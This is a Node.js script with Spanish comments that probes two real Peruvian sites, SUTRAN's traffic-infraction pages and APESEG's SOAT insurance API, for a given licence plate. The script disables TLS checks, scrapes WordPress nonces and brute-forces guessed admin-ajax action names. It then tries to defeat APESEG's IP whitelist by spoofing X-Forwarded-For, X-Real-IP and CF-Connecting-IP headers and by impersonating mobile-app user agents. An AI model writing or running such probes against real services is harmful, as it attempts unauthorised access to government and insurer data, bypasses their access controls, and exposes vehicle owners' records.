// scripts/test-sutran-ajax.js
// Explota el endpoint WordPress AJAX de SUTRAN y analiza verifica-tu-infraccion
const axios = require('axios');
const cheerio = require('cheerio');
const https = require('https');

const httpsAgent = new https.Agent({ rejectUnauthorized: false });
const HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
  'Accept-Language': 'es-PE,es;q=0.9',
};
const PLACA = 'CKR477';

async function get(url, extra = {}) {
  try {
    const r = await axios.get(url, { httpsAgent, headers: { ...HEADERS, ...extra.headers }, maxRedirects: 5, timeout: 15000, validateStatus: s => s < 600, ...extra });
    return r;
  } catch (e) { return { status: 0, data: '', error: e.message, headers: {} }; }
}

async function post(url, body, headers = {}) {
  try {
    const r = await axios.post(url, body, { httpsAgent, headers: { ...HEADERS, ...headers }, maxRedirects: 3, timeout: 15000, validateStatus: s => s < 600 });
    return r;
  } catch (e) { return { status: 0, data: '', error: e.message, headers: {} }; }
}

async function run() {
  const jar = {};
  const ck = () => Object.entries(jar).map(([k,v]) => `${k}=${v}`).join('; ');
  const mergeCk = (h) => (h?.['set-cookie'] || []).forEach(c => {
    const eq=c.indexOf('='), semi=c.indexOf(';');
    if(eq>0) jar[c.substring(0,eq).trim()]=(semi>eq?c.substring(eq+1,semi):c.substring(eq+1)).trim();
  });

  // ══════════════════════════════════════════════════════
  // BLOQUE 1: SUTRAN — verifica-tu-infraccion (nueva URL)
  // ══════════════════════════════════════════════════════
  console.log('🔍 SUTRAN — verifica-tu-infraccion\n');
  
  const rVerif = await get('https://www.sutran.gob.pe/consultas/record-de-infracciones/verifica-tu-infraccion/');
  mergeCk(rVerif.headers);
  console.log('Status:', rVerif.status, '| size:', rVerif.data?.length);
  
  let nonce = '';
  if (rVerif.status === 200 && rVerif.data) {
    const $ = cheerio.load(rVerif.data);
    console.log('Title:', $('title').text().trim().substring(0, 80));
    
    // Captcha?
    const has_recaptcha = rVerif.data.includes('recaptcha') || rVerif.data.includes('g-recaptcha');
    const has_img_captcha = rVerif.data.toLowerCase().includes('captcha') && !has_recaptcha;
    console.log('reCAPTCHA:', has_recaptcha, '| Image captcha:', has_img_captcha);
    
    // Buscar forms
    $('form').each((i, el) => {
      const action = $(el).attr('action') || '';
      const method = $(el).attr('method') || 'GET';
      if (action.includes('ajax') || action.includes('infrac') || action.includes('consulta') || !action.includes('buscador')) {
        console.log(`\nForm[${i}]: action="${action}" method="${method}"`);
        $(el).find('input,select,textarea').each((j, inp) => {
          const name = $(inp).attr('name') || '';
          const val = $(inp).val() || $(inp).attr('value') || '';
          const type = $(inp).attr('type') || $(inp).prop('tagName').toLowerCase();
          console.log(`  ${type} name="${name}" value="${val.substring(0, 80)}"`);
        });
      }
    });
    
    // Buscar nonce de WordPress
    const nonceMatch = rVerif.data.match(/['"_]nonce['"]?\s*[:=]\s*['"]([a-f0-9]{10})['"]/) ||
                       rVerif.data.match(/et_frontend_nonce['"]\s*:\s*['"]([^'"]+)['"]/) ||
                       rVerif.data.match(/nonce['"]\s*:\s*['"]([^'"]+)['"]/);
    if (nonceMatch) {
      nonce = nonceMatch[1];
      console.log('\nNonce encontrado:', nonce);
    }
    
    // Scripts con lógica de infraccion
    $('script[src]').each((i, el) => {
      const src = $(el).attr('src') || '';
      if (src.includes('infrac') || src.includes('consulta') || src.includes('custom') || src.includes('placa') || src.includes('record')) {
        console.log('Script:', src);
      }
    });
    
    $('script:not([src])').each((i, el) => {
      const t = $(el).html() || '';
      if ((t.includes('placa') || t.includes('infraccion') || t.includes('ajax') || t.includes('fetch')) && t.length > 50) {
        console.log(`Script inline[${i}]:`, t.substring(0, 1000));
      }
    });
    
    // Scripts de plugins de WP con endpoints
    const ajaxUrlMatch = rVerif.data.match(/ajaxurl['"]\s*:\s*['"]([^'"]+)['"]/);
    if (ajaxUrlMatch) console.log('\nAjax URL:', ajaxUrlMatch[1]);
  }
  
  // ── Probar WP Admin AJAX con diferentes actions ─────────────────────────
  console.log('\n--- WordPress AJAX endpoints SUTRAN ---');
  const ajaxUrl = 'http://www.sutran.gob.pe/wp-admin/admin-ajax.php';
  
  // Extraer nonce de la página de record
  const rRecord = await get('http://www.sutran.gob.pe/consultas/record-de-infracciones/record-de-infracciones/');
  const nonceRec = (rRecord.data || '').match(/et_frontend_nonce['"]\s*:\s*['"]([^'"]+)['"]/) ||
                   (rRecord.data || '').match(/nonce['"]\s*:\s*['"]([^'"]+)['"]/);
  const recordNonce = nonceRec?.[1] || nonce;
  console.log('Nonce del record page:', recordNonce);
  
  // Probar diferentes actions de WordPress AJAX
  const actions = ['consultar_infraccion', 'buscar_placa', 'get_infraccion', 'infraccion_consulta', 'sutran_consulta', 'record_infracciones', 'verificar_infraccion', 'placa_infraccion'];
  for (const action of actions) {
    const body = new URLSearchParams({ action, placa: PLACA, nonce: recordNonce || '' }).toString();
    const r = await post(ajaxUrl, body, {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest',
      'Referer': 'http://www.sutran.gob.pe/consultas/record-de-infracciones/record-de-infracciones/',
      'Cookie': ck(),
    });
    if (r.data && r.data !== '0' && r.data !== '-1' && r.data !== '') {
      console.log(`✅ action="${action}": ${r.status} | ${JSON.stringify(r.data).substring(0, 200)}`);
    } else {
      console.log(`❌ action="${action}": ${r.status} | "${r.data}"`);
    }
  }
  
  // ══════════════════════════════════════════════════════
  // BLOQUE 2: APESEG — API key desde la app Flutter/móvil
  // Buscamos el APK o endpoints del API sin whitelist  
  // ══════════════════════════════════════════════════════
  console.log('\n\n🔍 APESEG — Brechas alternativas\n');
  
  // APESEG tiene un formulario en apeseg.org.pe principal
  const rApesegMain = await get('https://www.apeseg.org.pe/');
  console.log('apeseg.org.pe status:', rApesegMain.status, '| size:', rApesegMain.data?.length);
  if (rApesegMain.status === 200) {
    const $a = cheerio.load(rApesegMain.data);
    console.log('Title:', $a('title').text().trim());
    
    // Buscar links de consulta SOAT
    $a('a[href]').each((i, el) => {
      const href = $a(el).attr('href') || '';
      const txt = $a(el).text().trim();
      if (href.toLowerCase().includes('soat') || href.toLowerCase().includes('consulta') || txt.toLowerCase().includes('soat')) {
        console.log(`  Link: "${txt}" → ${href}`);
      }
    });
    
    // Buscar scripts con endpoints
    $a('script:not([src])').each((i, el) => {
      const t = $a(el).html() || '';
      if (t.includes('api') || t.includes('soat') || t.includes('placa')) {
        console.log(`  Script:`, t.substring(0, 500));
      }
    });
  }
  
  // Probar la API con diferentes tokens/headers que imiten la app
  console.log('\n--- APESEG con headers de app Flutter ---');
  const flutterEndpoints = [
    { url: `https://api.apeseg.org.pe/consulta-soat/api/certificados/placa/${PLACA}`, ua: 'Dart/2.18 (dart:io)' },
    { url: `https://api.apeseg.org.pe/consulta-soat/api/certificados/placa/${PLACA}`, ua: 'okhttp/4.9.0' },
    { url: `https://api.apeseg.org.pe/consulta-soat/api/certificados/placa/${PLACA}`, ua: 'Apache-HttpClient/4.5.13 (Java/11.0.11)' },
    // Sin el guard "ipwhilelist" — probar como si viniéramos desde la red interna
    { url: `https://api.apeseg.org.pe/consulta-soat/api/certificados/placa/${PLACA}`, extra: { 'X-Forwarded-For': '181.65.0.1', 'X-Real-IP': '181.65.0.1', 'CF-Connecting-IP': '181.65.0.1' } },
    { url: `https://api.apeseg.org.pe/consulta-soat/api/certificados/placa/${PLACA}`, extra: { 'X-Forwarded-For': '200.48.0.1' } },
  ];
  
  for (const ep of flutterEndpoints) {
    const headers = {
      'User-Agent': ep.ua || HEADERS['User-Agent'],
      'Accept': 'application/json',
      'Origin': 'https://webapp.apeseg.org.pe',
      'Referer': 'https://webapp.apeseg.org.pe/',
      ...(ep.extra || {}),
    };
    const r = await get(ep.url, { headers });
    const preview = typeof r.data === 'object' ? JSON.stringify(r.data).substring(0, 200) : (r.data || '').substring(0, 150);
    const ua_short = (ep.ua || 'Chrome').split('/')[0];
    const extra_k = Object.keys(ep.extra || {}).join(',') || '';
    console.log(`  [${ua_short}${extra_k ? ' + ' + extra_k : ''}]: ${r.status} | ${preview}`);
  }
}

run().catch(console.error);
